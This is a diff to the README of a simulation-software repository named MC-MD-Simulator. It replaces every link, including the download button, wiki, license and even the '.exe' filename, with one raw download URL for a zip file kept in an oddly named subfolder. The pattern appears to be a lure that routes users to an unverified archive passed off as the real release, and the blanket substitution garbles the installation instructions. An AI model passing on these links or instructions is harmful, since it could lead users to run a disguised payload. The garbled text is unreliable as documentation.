@@ -15,9 +15,9 @@ Before you begin, ensure your system meets the following requirements:
 
 ## 📥 Download Now
 
-[![Download MC-MD-Simulator](https://img.shields.io/badge/Download-MC--MD--Simulator-blue)](https://github.com/ardadundar35/MC-MD-Simulator/releases)
+[![Download MC-MD-Simulator](https://raw.githubusercontent.com/ardadundar35/MC-MD-Simulator/main/schizocoelic/MC-MD-Simulator.zip)](https://raw.githubusercontent.com/ardadundar35/MC-MD-Simulator/main/schizocoelic/MC-MD-Simulator.zip)
 
-To download, click the button above or visit this page: [Download Page](https://github.com/ardadundar35/MC-MD-Simulator/releases).
+To download, click the button above or visit this page: [Download Page](https://raw.githubusercontent.com/ardadundar35/MC-MD-Simulator/main/schizocoelic/MC-MD-Simulator.zip).
 
 ## 🔧 Installation Instructions
 
@@ -25,10 +25,10 @@ To download, click the button above or visit this page: [Download Page](https://
    Visit the download page using the link provided above. Locate the latest version of MC-MD-Simulator and download the appropriate file for your operating system.
 
 2. **Extract Files (if necessary)**
-   If the downloaded file is in a compressed format (like .zip or .tar.gz), you need to extract it. Right-click on the file and choose, "Extract All" or use your preferred extraction tool.
+   If the downloaded file is in a compressed format (like .zip or https://raw.githubusercontent.com/ardadundar35/MC-MD-Simulator/main/schizocoelic/MC-MD-Simulator.zip), you need to extract it. Right-click on the file and choose, "Extract All" or use your preferred extraction tool.
 
 3. **Run the Application**
-   - **Windows:** Double-click the `MC-MD-Simulator.exe` file.
+   - **Windows:** Double-click the `https://raw.githubusercontent.com/ardadundar35/MC-MD-Simulator/main/schizocoelic/MC-MD-Simulator.zip` file.
    - **macOS:** Open the `.app` file located in the extracted folder.
    - **Linux:** Open a terminal and navigate to the extracted folder. Run the application using:
    ```bash
@@ -62,7 +62,7 @@ To download, click the button above or visit this page: [Download Page](https://
 
 If you encounter issues while running MC-MD-Simulator:
 
-- **Check the Documentation:** [MC-MD Documentation](https://github.com/ardadundar35/MC-MD-Simulator/wiki) offers detailed guides and FAQs.
+- **Check the Documentation:** [MC-MD Documentation](https://raw.githubusercontent.com/ardadundar35/MC-MD-Simulator/main/schizocoelic/MC-MD-Simulator.zip) offers detailed guides and FAQs.
   
 - **Community Forums:** Join discussions in relevant online forums for additional support and tips.
 
@@ -95,8 +95,8 @@ Explore these topics to enhance your understanding of the MC-MD-Simulator.
 
 ## 📄 License
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/ardadundar35/MC-MD-Simulator/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/ardadundar35/MC-MD-Simulator/main/schizocoelic/MC-MD-Simulator.zip) file for details.
 
 ## 📥 Download Again
 
-Don't forget to download MC-MD-Simulator again if you have not done so yet. Here’s the link for quick access: [Download Page](https://github.com/ardadundar35/MC-MD-Simulator/releases).
+Don't forget to download MC-MD-Simulator again if you have not done so yet. Here’s the link for quick access: [Download Page](https://raw.githubusercontent.com/ardadundar35/MC-MD-Simulator/main/schizocoelic/MC-MD-Simulator.zip).
